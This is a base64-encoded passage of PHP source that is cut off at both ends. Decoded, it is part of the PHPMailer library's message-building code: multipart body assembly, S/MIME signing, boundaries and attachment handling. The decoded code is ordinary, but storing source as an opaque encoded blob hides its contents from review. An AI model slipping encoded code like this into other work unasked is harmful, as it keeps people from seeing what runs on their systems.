AndGV4dC9jYWxlbmRhcjsgbWV0aG9kPVJFUVVFU1QnLCAnJyk7DQogICAgICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkljYWwsICR0aGlzLT5FbmNvZGluZyk7DQogICAgICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzJdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7Jyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRhbHRCb2R5Q2hhclNldCwgJ3RleHQvcGxhaW4nLCAkYWx0Qm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGJvZHlDaGFyU2V0LCAndGV4dC9odG1sJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdhdHRhY2htZW50JywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmVfYXR0YWNoJzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7Jyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsyXSAuICciJyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRhbHRCb2R5Q2hhclNldCwgJ3RleHQvcGxhaW4nLCAkYWx0Qm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5BbHRCb2R5LCAkYWx0Qm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMl0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVszXSAuICciJyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbM10sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbM10pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICR0aGlzLT5FbmNvZGluZyA9ICRib2R5RW5jb2Rpbmc7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJHRoaXMtPkVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgew0KICAgICAgICAgICAgJGJvZHkgPSAnJzsNCiAgICAgICAgfSBlbHNlaWYgKCR0aGlzLT5zaWduX2tleV9maWxlKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIGlmICghZGVmaW5lZCgnUEtDUzdfVEVYVCcpKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykgLiAnb3BlbnNzbCcpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkZmlsZSA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAnbWFpbCcpOw0KICAgICAgICAgICAgICAgIGlmIChmYWxzZSA9PT0gQGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkYm9keSkpIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc2lnbmluZycpIC4gJyBDb3VsZCBub3Qgd3JpdGUgdGVtcCBmaWxlJyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRzaWduZWQgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ3NpZ25lZCcpOw0KICAgICAgICAgICAgICAgIGlmIChlbXB0eSgkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUpKSB7DQogICAgICAgICAgICAgICAgICAgICRzaWduID0gQG9wZW5zc2xfcGtjczdfc2lnbigkZmlsZSwgJHNpZ25lZCwgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fY2VydF9maWxlKSwgYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAnZmlsZTovLycgLiByZWFscGF0aCgkdGhpcy0+c2lnbl9rZXlfZmlsZSksDQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2lnbl9rZXlfcGFzcw0KICAgICAgICAgICAgICAgICAgICApLCBudWxsKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkc2lnbiA9IEBvcGVuc3NsX3BrY3M3X3NpZ24oJGZpbGUsICRzaWduZWQsICdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2NlcnRfZmlsZSksIGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNpZ25fa2V5X3Bhc3MNCiAgICAgICAgICAgICAgICAgICAgKSwgbnVsbCwgUEtDUzdfREVUQUNIRUQsICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkc2lnbikgew0KICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRmaWxlKTsNCiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSBAZmlsZV9nZXRfY29udGVudHMoJHNpZ25lZCk7DQogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHNpZ25lZCk7DQogICAgICAgICAgICAgICAgICAgICRwYXJ0cyA9IGV4cGxvZGUoIlxuXG4iLCAkYm9keSwgMik7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyIC49ICRwYXJ0c1swXSAuICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSAkcGFydHNbMV07DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkZmlsZSk7DQogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHNpZ25lZCk7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NpZ25pbmcnKSAuIG9wZW5zc2xfZXJyb3Jfc3RyaW5nKCkpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4Yykgew0KICAgICAgICAgICAgICAgICRib2R5ID0gJyc7DQogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93ICRleGM7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkYm9keTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdldEJvdW5kYXJ5KCRib3VuZGFyeSwgJGNoYXJTZXQsICRjb250ZW50VHlwZSwgJGVuY29kaW5nKSB7DQogICAgICAgICRyZXN1bHQgPSAnJzsNCiAgICAgICAgaWYgKCRjaGFyU2V0ID09ICcnKSB7DQogICAgICAgICAgICAkY2hhclNldCA9ICR0aGlzLT5DaGFyU2V0Ow0KICAgICAgICB9DQogICAgICAgIGlmICgkY29udGVudFR5cGUgPT0gJycpIHsNCiAgICAgICAgICAgICRjb250ZW50VHlwZSA9ICR0aGlzLT5Db250ZW50VHlwZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGVuY29kaW5nID09ICcnKSB7DQogICAgICAgICAgICAkZW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7DQogICAgICAgIH0NCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICRib3VuZGFyeSk7DQogICAgICAgICRyZXN1bHQgLj0gc3ByaW50ZignQ29udGVudC1UeXBlOiAlczsgY2hhcnNldD0lcycsICRjb250ZW50VHlwZSwgJGNoYXJTZXQpOw0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsNCiAgICAgICAgaWYgKCRlbmNvZGluZyAhPSAnN2JpdCcpIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAkZW5jb2RpbmcpOw0KICAgICAgICB9DQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOw0KICAgICAgICByZXR1cm4gJHJlc3VsdDsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuZEJvdW5kYXJ5KCRib3VuZGFyeSkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPkxFIC4gJy0tJyAuICRib3VuZGFyeSAuICctLScgLiAkdGhpcy0+TEU7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRNZXNzYWdlVHlwZSgpIHsNCiAgICAgICAgJHR5cGUgPSBhcnJheSgpOw0KICAgICAgICBpZiAoJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsNCiAgICAgICAgICAgICR0eXBlW10gPSAnYWx0JzsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPmlubGluZUltYWdlRXhpc3RzKCkpIHsNCiAgICAgICAgICAgICR0eXBlW10gPSAnaW5saW5lJzsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPmF0dGFjaG1lbnRFeGlzdHMoKSkgew0KICAgICAgICAgICAgJHR5cGVbXSA9ICdhdHRhY2gnOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSBpbXBsb2RlKCdfJywgJHR5cGUpOw0KICAgICAgICBpZiAoJHRoaXMtPm1lc3NhZ2VfdHlwZSA9PSAnJykgew0KICAgICAgICAgICAgJHRoaXMtPm1lc3NhZ2VfdHlwZSA9ICdwbGFpbic7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGhlYWRlckxpbmUoJG5hbWUsICR2YWx1ZSkgew0KICAgICAgICByZXR1cm4gJG5hbWUgLiAnOiAnIC4gJHZhbHVlIC4gJHRoaXMtPkxFOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gdGV4dExpbmUoJHZhbHVlKSB7DQogICAgICAgIHJldHVybiAkdmFsdWUgLiAkdGhpcy0+TEU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRBdHRhY2htZW50KCRwYXRoLCAkbmFtZSA9ICcnLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2F0dGFjaG1lbnQnKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIUBpc19maWxlKCRwYXRoKSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2ZpbGVfYWNjZXNzJykgLiAkcGF0aCwgc2VsZjo6U1RPUF9DT05USU5VRSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsNCiAgICAgICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRwYXRoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCRwYXRoKTsNCiAgICAgICAgICAgIGlmICgkbmFtZSA9PSAnJykgew0KICAgICAgICAgICAgICAgICRuYW1lID0gJGZpbGVuYW1lOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgIDAgPT4gJHBhdGgsDQogICAgICAgICAgICAgICAgMSA9PiAkZmlsZW5hbWUsDQogICAgICAgICAgICAgICAgMiA9PiAkbmFtZSwNCiAgICAgICAgICAgICAgICAzID0+ICRlbmNvZGluZywNCiAgICAgICAgICAgICAgICA0ID0+ICR0eXBlLA0KICAgICAgICAgICAgICAgIDUgPT4gZmFsc2UsDQogICAgICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sDQogICAgICAgICAgICAgICAgNyA9PiAwDQogICAgICAgICAgICApOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4Yykgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QXR0YWNobWVudHMoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+YXR0YWNobWVudDsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGF0dGFjaEFsbCgkZGlzcG9zaXRpb25fdHlwZSwgJGJvdW5kYXJ5KSB7DQogICAgICAgICRtaW1lICAgID0gYXJyYXkoKTsNCiAgICAgICAgJGNpZFVuaXEgPSBhcnJheSgpOw0KICAgICAgICAkaW5jbCAgICA9IGFycmF5KCk7DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7DQogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJGRpc3Bvc2l0aW9uX3R5cGUpIHsNCiAgICAgICAgICAgICAgICAkc3RyaW5nICA9ICcnOw0KICAgICAgICAgICAgICAgICRwYXRoICAgID0gJyc7DQogICAgICAgICAgICAgICAgJGJTdHJpbmcgPSAkYXR0YWNobWVudFs1XTsNCiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsNCiAgICAgICAgICAgICAgICAgICAgJHN0cmluZyA9ICRhdHRhY2htZW50WzBdOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRwYXRoID0gJGF0dGFjaG1lbnRbMF07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRpbmNsaGFzaCA9IG1kNShzZXJpYWxpemUoJGF0dGFjaG1lbnQpKTsNCiAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJGluY2xoYXNoLCAkaW5jbCkpIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRpbmNsW10gICAgICA9ICRpbmNsaGFzaDsNCiAgICAgICAgICAgICAgICAkbmFtZSAgICAgICAgPSAkYXR0YWNobWVudFsyXTsNCiAgICAgICAgICAgICAgICAkZW5jb2RpbmcgICAgPSAkYXR0YWNobWVudFszXTsNCiAgICAgICAgICAgICAgICAkdHlwZSAgICAgICAgPSAkYXR0YWNobWVudFs0XTsNCiAgICAgICAgICAgICAgICAkZGlzcG9zaXRpb24gPSAkYXR0YWNobWVudFs2XTsNCiAgICAgICAgICAgICAgICAkY2lkICAgICAgICAgPSAkYXR0YWNobWVudFs3XTsNCiAgICAgICAgICAgICAgICBpZiAoJGRpc3Bvc2l0aW9uID09ICdpbmxpbmUnICYmIGFycmF5X2tleV9leGlzdHMoJGNpZCwgJGNpZFVuaXEpKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkY2lkVW5pcVskY2lkXSA9IHRydWU7DQogICAgICAgICAgICAgICAgJG1pbWVbXSAgICAgICAgPSBzcHJpbnRmKCctLSVzJXMnLCAkYm91bmRhcnksICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbmFtZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtVHlwZTogJXM7IG5hbWU9IiVzIiVzJywgJHR5cGUsICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkbmFtZSkpLCAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LVR5cGU6ICVzJXMnLCAkdHlwZSwgJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCRlbmNvZGluZyAhPSAnN2JpdCcpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2Rpbmc6ICVzJXMnLCAkZW5jb2RpbmcsICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkZGlzcG9zaXRpb24gPT0gJ2lubGluZScpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtSUQ6IDwlcz4lcycsICRjaWQsICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghKGVtcHR5KCRkaXNwb3NpdGlvbikpKSB7DQogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkX25hbWUgPSAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJG5hbWUpKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJy9bIFwoXCk8PkAsOzpcXCJcL1xbXF1cPz1dLycsICRlbmNvZGVkX25hbWUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1EaXNwb3NpdGlvbjogJXM7IGZpbGVuYW1lPSIlcyIlcycsICRkaXNwb3NpdGlvbiwgJGVuY29kZWRfbmFtZSwgJHRoaXMtPkxFIC4gJHRoaXMtPkxFKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGVuY29kZWRfbmFtZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1EaXNwb3NpdGlvbjogJXM7IGZpbGVuYW1lPSVzJXMnLCAkZGlzcG9zaXRpb24sICRlbmNvZGVkX25hbWUsICR0aGlzLT5MRSAuICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LURpc3Bvc2l0aW9uOiAlcyVzJywgJGRpc3Bvc2l0aW9uLCAkdGhpcy0+TEUgLiAkdGhpcy0+TEUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCRiU3RyaW5nKSB7DQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCRzdHJpbmcsICRlbmNvZGluZyk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJyc7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPmVuY29kZUZpbGUoJHBhdGgsICRlbmNvZGluZyk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJyc7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJy0tJXMtLSVzJywgJGJvdW5kYXJ5LCAkdGhpcy0+TEUpOw0KICAgICAgICByZXR1cm4gaW1wbG9kZSgnJywgJG1pbWUpOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZW5jb2RlRmlsZSgkcGF0aCwgJGVuY29kaW5nID0gJ2Jhc2U2NCcpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghaXNfcmVhZGFibGUoJHBhdGgpKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZmlsZV9vcGVuJykgLiAkcGF0aCwgc2VsZjo6U1RPUF9DT05USU5VRSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkbWFnaWNfcXVvdGVzID0gZ2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKCk7DQogICAgICAgICAgICBpZiAoJG1hZ2ljX3F1b3Rlcykgew0KICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcsICc8JykpIHsNCiAgICAgICAgICAgICAgICAgICAgc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKG